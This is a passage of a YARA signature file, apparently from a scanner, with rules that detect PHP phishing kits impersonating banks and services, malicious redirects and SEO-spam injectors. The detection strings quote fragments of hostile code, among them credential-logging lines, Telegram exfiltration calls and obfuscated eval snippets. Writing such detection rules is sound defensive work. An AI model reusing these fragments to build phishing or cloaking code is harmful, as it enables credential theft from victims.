        $ps0 = "$inputCon=date(\"Y-m-d h:i:sa\").\"---{$iipp}---\".$ref.\"---Refpage=\".$_GET['HOST']"
    condition:
        $ps0
}

rule php_phishing_script_037 : phishing
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR05931
}

private rule PR05932 : trigger
{
    strings:
        $ps0 = "else if(getenv('HTTP_X_FORWARDED_FOR'))"
    condition:
        $ps0
}

private rule PR05933 : trigger
{
    strings:
        $ps0 = "foreach ($browser_array as $regex => $value)"
    condition:
        $ps0
}

rule php_phishing_script_038 : phishing
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR04149 and PR05932 and PR05933
}

private rule PR05934 : trigger
{
    strings:
        $ps0 = "fopen(\"LOG-VICTIM.txt\",\"a\");"
    condition:
        $ps0
}

rule php_phishing_script_039 : phishing
{
    strings:
        $trigger = "<form"
    condition:
        $trigger and PR00042 and PR05934
}

rule php_phishing_script_040 : phishing
{
    strings:
        $trigger = "$ib_data2 = @json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\".$ib));"
    condition:
        $trigger
}

private rule PR05935 : trigger
{
    strings:
        $ps0 = "@fclose(@fwrite(@fopen(\"ip.txt\", \"a\"),\"\\n\".$ip));"
    condition:
        $ps0
}

rule php_phishing_script_041 : phishing
{
    strings:
        $trigger = "md5(time());"
    condition:
        $trigger and PR05935 and PR00273
}

private rule PR05936 : trigger
{
    strings:
        $ps0 = "fwrite($fp,\"[DETECTED ROBOT]\\n\");"
    condition:
        $ps0
}

rule php_phishing_script_042 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05936 and PR00357
}

rule php_phishing_script_043 : phishing
{
    strings:
        $trigger = ">Get a notification to your email when your scam page go down"
    condition:
        $trigger and PR00042 and PR00046
}

rule php_phishing_script_044 : phishing
{
    strings:
        $trigger = "By \xf0\x9f\x84\xb0\xf0\x9f\x84\xbd\xf0\x9f\x85\x83\xf0\x9f\x84\xb8"
    condition:
        $trigger and PR00042
}

private rule PR05937 : trigger
{
    strings:
        $ps0 = "O|P|T|U|S|N|E|T"
    condition:
        $ps0
}

rule php_phishing_script_045 : phishing
{
    strings:
        $trigger = "*/"
    condition:
        $trigger and PR05937
}

private rule PR05938 : trigger
{
    strings:
        $ps0 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);"
    condition:
        $ps0
}

rule php_phishing_script_046 : phishing
{
    strings:
        $trigger = "if (substr_count($hostname, $word) > 0) {"
    condition:
        $trigger and PR05579 and PR05938
}

rule php_phishing_script_047 : phishing
{
    strings:
        $trigger = "facebook.com/OReo0o"
    condition:
        $trigger and PR00042
}

rule php_phishing_script_048 : phishing
{
    strings:
        $trigger = "file_get_contents(\"https://api.telegram.org/bot\" . $token . \"/sendMessage?\" . http_build_query($datatrue));"
    condition:
        $trigger and PR00042
}

rule php_phishing_script_049 : phishing
{
    strings:
        $trigger = "$_SESSION['referer'] = isset($_SERVER['REQUEST_URI'])"
    condition:
        $trigger and PR02741 and PR05915
}

private rule PR05939 : trigger
{
    strings:
        $ps0 = "function getOs()"
    condition:
        $ps0
}

private rule PR05940 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));"
    condition:
        $ps0
}

private rule PR05941 : trigger
{
    strings:
        $ps0 = "$apitoken = $_GET['apitoken'];"
    condition:
        $ps0
}

rule php_phishing_script_050 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05939 and PR05940 and PR05941
}

rule php_phishing_script_051 : phishing
{
    strings:
        $trigger = "echo '<meta http-equiv=\"refresh\" content=\"0; url='.$randomString.'\" />';"
    condition:
        $trigger
}

rule php_phishing_script_052 : phishing
{
    strings:
        $trigger = "$total_billing = count_c(\"../result/total_"
    condition:
        $trigger and PR00247
}

private rule PR05942 : trigger
{
    strings:
        $ps0 = "\"../result/total_"
    condition:
        $ps0
}

rule php_phishing_script_053 : phishing
{
    strings:
        $trigger = "echo \"<script type='text/javascript'>window.top.location="
    condition:
        $trigger and PR05942
}

rule php_phishing_script_054 : phishing
{
    strings:
        $trigger = "<title>Total.: ( <?php echo \"$num_linhas\"; ?> )</title>"
    condition:
        $trigger
}

rule php_phishing_script_055 : phishing
{
    strings:
        $trigger = "FREAKZBROTHERS"
    condition:
        $trigger and PR00042
}

rule php_phishing_script_056 : phishing
{
    strings:
        $trigger = "$php_js=(object) array_merge((array) $php_js, (array) json_decode(file_get_contents(__dir__.'/config.json')));"
    condition:
        $trigger
}

private rule PR05943 : trigger
{
    strings:
        $ps0 = "$php_js->fake_base"
    condition:
        $ps0
}

rule php_phishing_script_056_02 : phishing
{
    strings:
        $trigger = "file_"
    condition:
        $trigger and PR05943
}

private rule PR05944 : trigger
{
    strings:
        $ps0 = "fwrite($filexox2,$ipxox2.\"\\n\");"
    condition:
        $ps0
}

rule php_phishing_script_058 : phishing
{
    strings:
        $trigger = "rand("
    condition:
        $trigger and PR05944
}

private rule PR05945 : trigger
{
    strings:
        $ps0 = "define('SERVER_AJAX_URL', get_site_protocol().'://'.SERVER_DOMAIN.'/engine/ajax/form.php');"
    condition:
        $ps0
}

rule php_phishing_script_059 : phishing
{
    strings:
        $trigger = "$content = preg_replace('#<script[^>]*>.*</script>#Usi', '', $content);"
    condition:
        $trigger and PR05945 and PR04936
}

private rule PR05946 : trigger
{
    strings:
        $ps0 = "bottom_proc("
    condition:
        $ps0
}

private rule PR05947 : trigger
{
    strings:
        $ps0 = "<title>[TEXT_"
    condition:
        $ps0
}

rule php_phishing_script_059_02 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR05946 and PR00046 and PR05947
}

rule php_phishing_script_060 : phishing
{
    strings:
        $trigger = "\"$username:$password:$ip:$useragent\" . PHP_EOL, FILE_APPEND);"
    condition:
        $trigger and PR00435
}

private rule PR05948 : trigger
{
    strings:
        $ps0 = "$allbad = file_get_contents(\"blocklist.txt\");"
    condition:
        $ps0
}

rule php_phishing_script_061 : phishing
{
    strings:
        $trigger = "echo \"OK\";"
    condition:
        $trigger and PR05948
}

private rule PR05949 : trigger
{
    strings:
        $ps0 = "fSOCIETY"
    condition:
        $ps0
}

rule php_phishing_script_062 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05949
}

private rule PR05950 : trigger
{
    strings:
        $ps0 = "require_once 'config/blocker.php';"
    condition:
        $ps0
}

rule php_phishing_script_063 : phishing
{
    strings:
        $trigger = "require_once('config/config.php');"
    condition:
        $trigger and PR05950
}

private rule PR05951 : trigger
{
    strings:
        $ps0 = "str_"
    condition:
        $ps0
}

rule php_phishing_script_064 : phishing
{
    strings:
        $trigger = "header(\"Location"
    condition:
        $trigger and PR01415 and PR05579 and PR05951
}

private rule PR05952 : trigger
{
    strings:
        $ps0 = "getOS($_SERVER["
    condition:
        $ps0
}

private rule PR05953 : trigger
{
    strings:
        $ps0 = ".$_SESSION["
    condition:
        $ps0
}

rule php_phishing_script_065 : phishing
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR05952 and PR05953 and PR03302
}

rule php_phishing_script_066 : phishing
{
    strings:
        $trigger = "(isset($_POST[\"CardNumber"
    condition:
        $trigger and PR04221 and PR00273
}

private rule PR05954 : trigger
{
    strings:
        $ps0 = "http_build_query"
    condition:
        $ps0
}

private rule PR05955 : trigger
{
    strings:
        $ps0 = "sendMessage?"
    condition:
        $ps0
}

private rule PR05956 : trigger
{
    strings:
        $ps0 = "$username"
    condition:
        $ps0
}

rule php_phishing_script_067 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05954 and PR00355 and PR05955 and PR05956 and PR04221 and PR00357
}

rule php_phishing_script_068 : phishing
{
    strings:
        $trigger = "$imeilist = preg_split('/(\\r?\\n)+/', $imeilist);"
    condition:
        $trigger and PR00042
}

rule php_phishing_script_069 : phishing
{
    strings:
        $trigger = "Contact me on telegram : https://t.me/elgh03t"
    condition:
        $trigger and PR00042
}

rule php_phishing_script_070 : phishing
{
    strings:
        $trigger = "<h2>Panneau de configuration</h2>"
    condition:
        $trigger and PR02534 and PR05843
}

// MANUAL FIX NECESSARY
rule php_phishing_script_073 : phishing
{
    strings:
        $trigger = "<html"
        $php_phishing_script_073_r0 = /<[tT][iI][tT][lL][eE]>[\s]*[bB][aA][nN][kK][\s]*[oO0][fF][\s]*[aA][mM][eE][rR][iI][cC][aA]/
    condition:
        $trigger and $php_phishing_script_073_r0
}

rule php_phishing_script_075 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01403 and PR05954 and PR04221 and PR05752 and PR00273 and PR00357
}

rule php_phishing_securespend_001 : phishing
{
    strings:
        $trigger = "<title>SecureSpend"
    condition:
        $trigger and PR00046
}

private rule PR05957 : trigger
{
    strings:
        $ps0 = "$senha = geraSenha(67, true,"
    condition:
        $ps0
}

rule php_phishing_senha_redirect_001 : phishing
{
    strings:
        $trigger = "http-equiv=\"refresh\""
    condition:
        $trigger and PR05957
}

private rule PR05958 : trigger
{
    strings:
        $ps0 = "Bienvenue sur le site sfr.fr"
    condition:
        $ps0
}

rule php_phishing_sfr_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR05958
}

private rule PR05959 : trigger
{
    strings:
        $ps0 = "-+ SFR Card  +-"
    condition:
        $ps0
}

rule php_phishing_sfr_002 : phishing
{
    strings:
        $trigger = "$subj"
    condition:
        $trigger and PR05959
}

rule php_phishing_sfr_003 : phishing
{
    strings:
        $trigger = "$url='https://www.sfr.fr/cas/login';"
    condition:
        $trigger and PR01746
}

private rule PR05960 : trigger
{
    strings:
        $ps0 = "SHADOW Z118"
    condition:
        $ps0
}

rule php_phishing_ShadowZ118_001 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05960
}

rule php_phishing_ShadowZ118_001_02 : phishing
{
    strings:
        $trigger = "SHADOW Z118"
    condition:
        $trigger and PR00092
}

rule php_phishing_shaw_001 : phishing
{
    strings:
        $trigger = "Shaw Communications"
    condition:
        $trigger and PR00301 and PR00247
}

rule php_phishing_sparkasse_001 : phishing
{
    strings:
        $trigger = "<title>netbanking.sparkasse.at"
    condition:
        $trigger
}

rule php_phishing_sparkasse_002 : phishing
{
    strings:
        $trigger = "<title>Online-Banking - Bequem in jeder Lebenslage -"
    condition:
        $trigger
}

private rule PR05961 : trigger
{
    strings:
        $ps0 = "Spotify</title>"
    condition:
        $ps0
}

rule php_phishing_spotify_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR05961
}

private rule PR05962 : trigger
{
    strings:
        $ps0 = "submitHandler"
    condition:
        $ps0
}

rule php_phishing_spotify_002 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR05962 and PR00046 and PR05961
}

private rule PR05963 : trigger
{
    strings:
        $ps0 = "$msg .= \"PIN: \".$_POST['csp"
    condition:
        $ps0
}

rule php_phishing_standardbank_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05963
}

rule php_phishing_standardbank_001_02 : phishing
{
    strings:
        $trigger = "$msg = \"OTP: \".$_POST['dap"
    condition:
        $trigger and PR00247
}

private rule PR05964 : trigger
{
    strings:
        $ps0 = "$msg .= 'Password : '.$_POST['emailpass"
    condition:
        $ps0
}

rule php_phishing_standardbank_001_03 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05964
}

private rule PR05965 : trigger
{
    strings:
        $ps0 = "<label for=\"reason\">Reason</label>"
    condition:
        $ps0
}

private rule PR05966 : trigger
{
    strings:
        $ps0 = "stripe"
    condition:
        $ps0
}

rule php_phishing_stripe_001 : phishing
{
    strings:
        $trigger = "input type=\"text\""
    condition:
        $trigger and PR05965 and PR05966
}

private rule PR05967 : trigger
{
    strings:
        $ps0 = "', print_r($_POST,true), FILE_APPEND | LOCK_EX);"
    condition:
        $ps0
}

private rule PR05968 : trigger
{
    strings:
        $ps0 = "extract($_POST)"
    condition:
        $ps0
}

rule php_phishing_stripe_001_02 : phishing
{
    strings:
        $trigger = "Stripe"
    condition:
        $trigger and PR00435 and PR05967 and PR05968
}

private rule PR05969 : trigger
{
    strings:
        $ps0 = "extract($_POST);"
    condition:
        $ps0
}

rule php_phishing_stripe_001_03 : phishing
{
    strings:
        $trigger = "Stripe"
    condition:
        $trigger and PR00435 and PR05967 and PR05969
}

rule php_phishing_stripe_mailer_001 : phishing
{
    strings:
        $trigger = "$subject = \"STRIPE LOGIN | \".$ip"
    condition:
        $trigger and PR00301
}

rule php_phishing_suntrust_001 : phishing
{
    strings:
        $trigger = "<title>SunTrust - Online Banking"
    condition:
        $trigger
}

private rule PR05970 : trigger
{
    strings:
        $ps0 = "\"ALERT!Your TD Canada Trust Card has been blocked"
    condition:
        $ps0
}

rule php_phishing_TDCanada_001 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05970
}

rule php_phishing_TDCanada_002 : phishing
{
    strings:
        $trigger = "<title>TD Canada Trust Accounts"
    condition:
        $trigger
}

rule php_phishing_TDCanada_002_02 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0; url=<?php print 'v1.php?personal=' . rand"
    condition:
        $trigger
}

rule php_phishing_TDCanada_002_03 : phishing
{
    strings:
        $trigger = "<title>EasyWeb - Login to our secure financial services"
    condition:
        $trigger
}

rule php_phishing_TDCanada_003 : phishing
{
    strings:
        $trigger = "<title>-TD Canada Trust:Support"
    condition:
        $trigger
}

rule php_phishing_telegram_mailer_001 : phishing
{
    strings:
        $trigger = "api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id="
    condition:
        $trigger and PR02062 and PR01021
}

// MANUAL FIX NECESSARY
private rule PR05971 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"https://api.telegram.org/bot$token/sendMessage?"
    condition:
        $ps0
}

rule php_phishing_telegram_mailer_002 : phishing
{
    strings:
        $trigger = "fopen"
        $php_phishing_telegram_mailer_002_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR05971 and PR00355 and $php_phishing_telegram_mailer_002_r0
}

private rule PR05972 : trigger
{
    strings:
        $ps0 = "We're just checking your information</span>"
    condition:
        $ps0
}

rule php_phishing_uk_gov_001 : phishing
{
    strings:
        $trigger = "<h1>Tax Refund</h1>"
    condition:
        $trigger and PR00042 and PR00278 and PR05972
}

private rule PR05973 : trigger
{
    strings:
        $ps0 = "<title>Vehicle Tax Refund</title>"
    condition:
        $ps0
}

rule php_phishing_uk_gov_001_02 : phishing
{
    strings:
        $trigger = "Account"
    condition:
        $trigger and PR05973
}

rule php_phishing_unionbank_001 : phishing
{
    strings:
        $trigger = "Union Bank of the Philippines"
    condition:
        $trigger and PR00042
}

rule php_phishing_UPS_001 : phishing
{
    strings:
        $trigger = "<title>Home | UPS"
    condition:
        $trigger
}

private rule PR05974 : trigger
{
    strings:
        $ps0 = "/data.us/data.verifyonline"
    condition:
        $ps0
}

rule php_phishing_usbank_001 : phishing
{
    strings:
        $trigger = "http-equiv=\"refresh\""
    condition:
        $trigger and PR05974
}

rule php_phishing_usbank_002 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.usbank.com/online-banking/"
    condition:
        $trigger
}

private rule PR05975 : trigger
{
    strings:
        $ps0 = "About.USPS.com"
    condition:
        $ps0
}

rule php_phishing_usps_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR05975
}

rule php_phishing_visa_001 : phishing
{
    strings:
        $trigger = "<title>Visa Inc"
    condition:
        $trigger and PR00281
}

private rule PR05976 : trigger
{
    strings:
        $ps0 = "Visa Resultz"
    condition:
        $ps0
}

rule php_phishing_visa_001_02 : phishing
{
    strings:
        $trigger = "$subj"
    condition:
        $trigger and PR05976
}

rule php_phishing_visa_001_03 : phishing
{
    strings:
        $trigger = "content=\"Verified by Visa"
    condition:
        $trigger and PR00042 and PR00278
}

rule php_phishing_vodafone_001 : phishing
{
    strings:
        $trigger = "<title>Vodafone</title>"
    condition:
        $trigger
}

private rule PR05977 : trigger
{
    strings:
        $ps0 = "Volksbanken Raiffeisenbanken"
    condition:
        $ps0
}

rule php_phishing_volksbank_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00042 and PR05977
}

rule php_phishing_volksbank_002 : phishing
{
    strings:
        $trigger = "<title>eBanking Private"
    condition:
        $trigger
}

private rule PR05978 : trigger
{
    strings:
        $ps0 = "Walmart Stores, Inc"
    condition:
        $ps0
}

rule php_phishing_walmart_001 : phishing
{
    strings:
        $trigger = "Account"
    condition:
        $trigger and PR00042 and PR05978
}

private rule PR05979 : trigger
{
    strings:
        $ps0 = " ?>/favicon.ico\""
    condition:
        $ps0
}

rule php_phishing_webmail_001 : phishing
{
    strings:
        $trigger = "?> Webmail Security Systems"
    condition:
        $trigger and PR00301 and PR00373 and PR05979
}

rule php_phishing_westernunion_001 : phishing
{
    strings:
        $trigger = "header(\"Location: signInAction.do.error.html?error=$login\");"
    condition:
        $trigger and PR00301 and PR01123
}

// MANUAL FIX NECESSARY
rule php_phishing_WeTransfer_001 : phishing
{
    strings:
        $trigger = "$_GET["
        $php_phishing_WeTransfer_001_r0 = /<title>WeTra?nsfer(\.com|)/
    condition:
        $trigger and $php_phishing_WeTransfer_001_r0
}

private rule PR05980 : trigger
{
    strings:
        $ps0 = "WeTransfer Plus"
    condition:
        $ps0
}

rule php_phishing_wetransfer_002 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05980
}

rule php_phishing_whatsapp_002 : phishing
{
    strings:
        $trigger = "<title>WhatsApp  \xe2\x80\x94  $Title"
    condition:
        $trigger
}

private rule PR05981 : trigger
{
    strings:
        $ps0 = "WhatsApp Phisher"
    condition:
        $ps0
}

rule php_phishing_whatsapp_003 : phishing
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR05981
}

rule php_phishing_winmail_001 : phishing
{
    strings:
        $trigger = "Mail | \xe7\xad\xbe\xe5\x88\xb0"
    condition:
        $trigger and PR00042
}

rule php_phishing_Xclusiv_3D_mailer_004 : phishing
{
    strings:
        $trigger = "Xclusiv-3D"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_xoom_001 : phishing
{
    strings:
        $trigger = "\"Xoom Password: \".$_POST["
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_yahoo_001 : phishing
{
    strings:
        $trigger = "$_POST['yahoopassword"
    condition:
        $trigger
}

rule php_phishing_yahoo_002 : phishing
{
    strings:
        $trigger = "header(\"Location:  http://mail.yahoo.com"
    condition:
        $trigger
}

private rule PR05982 : trigger
{
    strings:
        $ps0 = "<title>Yahoo -&nbsp;login</title>"
    condition:
        $ps0
}

rule php_phishing_yahoo_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05982
}

rule php_phishing_yahoo_004 : phishing
{
    strings:
        $trigger = "if(preg_match('/yahoo.co.jp/',"
    condition:
        $trigger and PR00050 and PR05482
}

private rule PR05983 : trigger
{
    strings:
        $ps0 = "isset($_SESSION["
    condition:
        $ps0
}

private rule PR05984 : trigger
{
    strings:
        $ps0 = "login.yahoo.com/account"
    condition:
        $ps0
}

rule php_phishing_yahoo_005 : phishing
{
    strings:
        $trigger = "Yahoo"
    condition:
        $trigger and PR00042 and PR05983 and PR05984
}

private rule PR05985 : trigger
{
    strings:
        $ps0 = "||~~ BY ~~ Zayan_bouch"
    condition:
        $ps0
}

rule php_phishing_ZayanBounch_001 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05985
}

private rule PR05986 : trigger
{
    strings:
        $ps0 = "SCAM MADE BY Zer0ocool"
    condition:
        $ps0
}

rule php_phishing_zerocool_001 : phishing
{
    strings:
        $trigger = "header(\"location:"
    condition:
        $trigger and PR05986
}

rule php_redirect_header_location_012 : redirect
{
    strings:
        $trigger = "$code=\"\";foreach ($data as $var){ $code.=chr($var);} eval($code);"
    condition:
        $trigger
}

rule php_redirect_header_location_014 : redirect
{
    strings:
        $trigger = "{ echo ' <meta http-equiv=\"refresh\" content=\"0;URL=http://www.google.com\" />';"
    condition:
        $trigger
}

private rule PR05987 : trigger
{
    strings:
        $ps0 = " $e = '.php'; $q = \"\"; $test = 'suka-test'; if"
    condition:
        $ps0
}

rule php_redirect_header_location_015 : redirect
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR05987
}

rule php_redirect_header_location_015_02 : redirect
{
    strings:
        $trigger = "JHRlc3QgPSAnc3VrYS10ZXN0Jzs"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_redirect_header_location_016 : redirect
{
    strings:
        $trigger = "eto spisok ip"
    condition:
        $trigger and PR00080
}

rule php_redirect_header_location_024 : redirect
{
    strings:
        $trigger = "fwrite($fp, '<?php header(\"Location: '.$urlz.'\"); ?>');"
    condition:
        $trigger
}

rule php_redirect_header_location_025 : redirect
{
    strings:
        $trigger = "$p=str_replace('href=\"','href=\"./wp-index.php?Q=',$p);"
    condition:
        $trigger
}

private rule PR05988 : trigger
{
    strings:
        $ps0 = "\"])) header(\"\\x4c\\157\\x63\\141\\x74\\151\\x6f\\156\\x3a\\40\\x68\\164\\x74"
    condition:
        $ps0
}

rule php_redirect_header_location_026 : redirect
{
    strings:
        $trigger = "$_GE"
    condition:
        $trigger and PR05988
}

private rule PR05989 : trigger
{
    strings:
        $ps0 = "array('google.', 'yandex.', 'yahoo"
    condition:
        $ps0
}

rule php_redirect_header_location_027 : redirect
{
    strings:
        $trigger = "if (isset($_SERVER['HTTP_REFERER']) and !isset($_COOKIE["
    condition:
        $trigger and PR01514 and PR05989
}

rule php_redirect_header_location_028 : redirect
{
    strings:
        $trigger = "$links = explode('|||', trim(base64_decode('aHR0cDovL"
    condition:
        $trigger and PR01818
}

rule php_redirect_header_location_029 : redirect
{
    strings:
        $trigger = "strpos($_SERVER['REQUEST_URI'], str_rot13(\"trarevp\")"
    condition:
        $trigger
}

private rule PR05990 : trigger
{
    strings:
        $ps0 = ");header('Location: http:"
    condition:
        $ps0
}

rule php_redirect_header_location_030 : redirect
{
    strings:
        $trigger = ".php');die();}"
    condition:
        $trigger and PR05990 and PR00391 and PR04656
}

private rule PR05991 : trigger
{
    strings:
        $ps0 = "(!is_bot())"
    condition:
        $ps0
}

rule php_redirect_header_location_031 : redirect
{
    strings:
        $trigger = "$spiders = array("
    condition:
        $trigger and PR05991 and PR05452 and PR01746
}

private rule PR05992 : trigger
{
    strings:
        $ps0 = "$_GET['type']=='login')"
    condition:
        $ps0
}

rule php_redirect_header_location_032 : redirect
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR00608 and PR05992
}

rule php_redirect_header_location_033 : redirect
{
    strings:
        $trigger = "{if(stripos($_SERVER['HTTP_USER_AGENT'],$"
    condition:
        $trigger and PR00391 and PR04656
}

private rule PR05993 : trigger
{
    strings:
        $ps0 = "is_bot()"
    condition:
        $ps0
}

private rule PR05994 : trigger
{
    strings:
        $ps0 = "stripos($_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

rule php_redirect_header_location_034 : redirect
{
    strings:
        $trigger = "$spiders = array("
    condition:
        $trigger and PR05452 and PR05993 and PR01746 and PR05994
}

rule php_redirect_header_location_035 : redirect
{
    strings:
        $trigger = "if($_GET[\"bajatax\"]==\"check\") die(\"bajatax\");"
    condition:
        $trigger
}

private rule PR05995 : trigger
{
    strings:
        $ps0 = "chr(115).chr(112).chr(101).chr(99).chr(105).chr(97).chr(108).chr(97)"
    condition:
        $ps0
}

rule php_redirect_mass_injection_001 : redirect
{
    strings:
        $trigger = "echo \"<script src="
    condition:
        $trigger and PR05995
}

rule php_spamseo_analiytics_001 : spamseo
{
    strings:
        $trigger = "google-analiytics.com"
    condition:
        $trigger and PR00070 and PR02163
}

rule php_spamseo_aQ0O010O_001 : spamseo
{
    strings:
        $trigger = "'header'=>\"User-Agent: aQ0O010O\""
    condition:
        $trigger
}

private rule PR05996 : trigger
{
    strings:
        $ps0 = "$outch = curl_exec($ch);"
    condition:
        $ps0
}

rule php_spamseo_Autodor_Wmsn_001 : spamseo
{
    strings:
        $trigger = "require_once 'conf.php';"
    condition:
        $trigger and PR00431 and PR05996
}

private rule PR05997 : trigger
{
    strings:
        $ps0 = "file_put_contents('conf.php', \""
    condition:
        $ps0
}

rule php_spamseo_Autodor_Wmsn_002 : spamseo
{
    strings:
        $trigger = "require_once 'conf.php';"
    condition:
        $trigger and PR00431 and PR05997
}

private rule PR05998 : trigger
{
    strings:
        $ps0 = "bb\">BBCode</a>"
    condition:
        $ps0
}

rule php_spamseo_Autodor_Wmsn_003 : spamseo
{
    strings:
        $trigger = "require_once 'conf.php';"
    condition:
        $trigger and PR00431 and PR05998
}

private rule PR05999 : trigger
{
    strings:
        $ps0 = "require_once 'conf.php';"
    condition:
        $ps0
}

rule php_spamseo_Autodor_Wmsn_004 : spamseo
{
    strings:
        $trigger = "header('Location: '.$dir);"
    condition:
        $trigger and PR05999
}

private rule PR06000 : trigger
{
    strings:
        $ps0 = "$maxfoto"
    condition:
        $ps0
}

private rule PR06001 : trigger
{
    strings:
        $ps0 = "$rcakey = 'rca.1.1."
    condition:
        $ps0
}

rule php_spamseo_Autodor_Wmsn_005 : spamseo
{
    strings:
        $trigger = "dir"
    condition:
        $trigger and PR06000 and PR06001
}

private rule PR06002 : trigger
{
    strings:
        $ps0 = "LXNpemU6MjRweDtmb250LXdlaWdodDpib2xkIj5QbGVhc2Ugc2VsZWN0IFlvdXIgU0hPUCE8L3A+PC9jYXB0"
    condition:
        $ps0
}

rule php_spamseo_backlinks_002 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06002 and PR01877
}

private rule PR06003 : trigger
{
    strings:
        $ps0 = "function curlRequest($url)"
    condition:
        $ps0
}

private rule PR06004 : trigger
{
    strings:
        $ps0 = "require_once('url_slug.php');"
    condition:
        $ps0
}

rule php_spamseo_backlinks_003 : spamseo
{
    strings:
        $trigger = "<?php include('siteconfig.php');"
    condition:
        $trigger and PR01480 and PR06003 and PR06004
}

private rule PR06005 : trigger
{
    strings:
        $ps0 = "header('HTTP/1.0 404 Not Found"
    condition:
        $ps0
}

rule php_spamseo_bannedIP_001 : spamseo
{
    strings:
        $trigger = "$bannedIP = array(\"^66.102.*.*\","
    condition:
        $trigger and PR06005
}

private rule PR06006 : trigger
{
    strings:
        $ps0 = "$wp_uri = pack(\"H*\","
    condition:
        $ps0
}

rule php_spamseo_beaninjector_001 : spamseo
{
    strings:
        $trigger = "include_once"
    condition:
        $trigger and PR06006
}

rule php_spamseo_bkeyword_001 : spamseo
{
    strings:
        $trigger = "$redirect = str_replace(\"XXXXXXXXXXXXX"
    condition:
        $trigger
}

rule php_spamseo_black_hat_client_001 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']=\"THISISTESTOPEN\";"
    condition:
        $trigger and PR00732
}

private rule PR06007 : trigger
{
    strings:
        $ps0 = "echo$block;file_put_contents($page_file"
    condition:
        $ps0
}

rule php_spamseo_block_injector_001 : spamseo
{
    strings:
        $trigger = "dir"
    condition:
        $trigger and PR06007
}

private rule PR06008 : trigger
{
    strings:
        $ps0 = "echo$content;die();}}}"
    condition:
        $ps0
}

rule php_spamseo_block_injector_001_02 : spamseo
{
    strings:
        $trigger = "dir"
    condition:
        $trigger and PR06008
}

rule php_spamseo_brands_001 : spamseo
{
    strings:
        $trigger = "<title>wholesale nike shoes,cheap nike shoes sale,wholesale nike free 3.0,cheap nike air max 90</title>"
    condition:
        $trigger
}

rule php_spamseo_brands_002 : spamseo
{
    strings:
        $trigger = "<meta name=\"keywords\" content=\"nike air max"
    condition:
        $trigger
}

private rule PR06009 : trigger
{
    strings:
        $ps0 = "str_replace(array($"
    condition:
        $ps0
}

private rule PR06010 : trigger
{
    strings:
        $ps0 = "array($dir, 'http"
    condition:
        $ps0
}

rule php_spamseo_brands_003 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR06009 and PR06010
}

rule php_spamseo_burst_001 : spamseo
{
    strings:
        $trigger = "define('__DOMAIN_NAME__', 'megatechnologies.com');"
    condition:
        $trigger
}

private rule PR06011 : trigger
{
    strings:
        $ps0 = "DirectoryIndex cache.managed.php"
    condition:
        $ps0
}

private rule PR06012 : trigger
{
    strings:
        $ps0 = "chmod($dir.\"/cache.managed.php\", 0777);"
    condition:
        $ps0
}

rule php_spamseo_cache_managed_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR06011 and PR06012
}

private rule PR06013 : trigger
{
    strings:
        $ps0 = "if (preg_match(\"/zh-c/i\", $lang)==false||preg_match"
    condition:
        $ps0
}

rule php_spamseo_chinese_spam_001 : spamseo
{
    strings:
        $trigger = "echo \"<script type='text/javascript' src='http"
    condition:
        $trigger and PR00080 and PR00113 and PR06013
}

rule php_spamseo_chunkarr_001 : spamseo
{
    strings:
        $trigger = "eval($GLOBALS[\"chunkarr\"]["
    condition:
        $trigger
}

rule php_spamseo_classwptext_002 : spamseo
{
    strings:
        $trigger = "$tpl_path = '/wp-admin/includes/template.html';"
    condition:
        $trigger and PR00080 and PR00113
}

rule php_spamseo_cmFuZA_001 : spamseo
{
    strings:
        $trigger = "if(preg_match(chr(47).chr(103).chr(111).chr(111).chr(103).chr(108).chr(101).chr(124)."
    condition:
        $trigger and PR00091
}

// MANUAL FIX NECESSARY
private rule PR06014 : trigger
{
    strings:
        $ps0 = "if(!$_COOKIE["
    condition:
        $ps0
}

rule php_spamseo_crypper_001 : spamseo
